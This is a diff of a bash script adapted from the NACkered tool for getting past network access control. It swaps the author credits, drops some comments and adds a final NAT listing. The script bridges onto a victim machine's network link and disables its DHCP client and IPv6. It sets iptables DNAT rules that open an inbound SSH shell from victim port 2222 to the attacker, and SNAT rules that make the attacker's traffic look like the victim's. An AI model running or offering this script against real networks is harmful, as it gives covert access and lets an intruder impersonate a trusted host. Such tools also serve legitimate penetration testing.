@@ -1,6 +1,7 @@
 #!/bin/bash
-## Matt E - NACkered v2.92.2 - KPMG LLP 2014
-## KPMG UK Cyber Defence Services
+## Script modified by Chester Taupieka and Jeremy Schoeneman, 2019
+## Thanks to Matt E - NACkered v2.92.2 - KPMG LLP 2014
+
 dhclient -r
 pkill dhcpcd
 modprobe br_netfilter
@@ -28,6 +29,7 @@ if [ "$1" == "--about" ] ; then
 	echo -e "Insert info about script here"
 	exit 0
 fi
+
 service network-manager stop
 echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
 sysctl -p
@@ -102,18 +104,16 @@ route add default gw 169.254.66.1
 echo "Setting up SSH reverse shell inbound on BICTIMIP:2222 to ATTACKERIP:22"
 iptables -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT -j DNAT --to $BRIP:22
 
-echo 
-#read -p "Setting up Layer 3 rewrite rules" -n1 -s
-echo 
-
 #Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMPIP and give it a port in the range for NAT
 iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
 iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
 iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP
 
 echo "Re-enabling traffic flow; monitor ports for lockout"
-#Re-enable L2 and L3
+
 arptables -D OUTPUT -j DROP
 iptables -D OUTPUT -j DROP
 
 echo "You're all set! Happy Hunting!"
+
+iptables -L -t nat
